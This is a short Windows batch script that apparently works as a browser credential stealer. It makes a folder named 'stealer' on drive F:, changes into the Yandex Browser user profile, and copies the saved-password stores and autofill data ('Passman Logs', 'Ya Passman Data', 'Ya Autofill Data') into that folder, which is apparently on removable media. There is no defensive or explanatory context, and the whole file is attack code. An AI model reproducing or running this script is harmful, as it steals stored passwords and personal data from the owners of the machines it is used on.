@echo off
md F:\stealer\Yandex
cd ..\
c:
cd %AppData%
cd ..\
cd Local/Yandex/YandexBrowser
cd User Data/Default
xcopy "Passman Logs" "f:\stealer\Yandex"
xcopy "Ya Passman Data" "f:\stealer\Yandex"
xcopy "Ya Autofill Data" "f:\stealer\Yandex"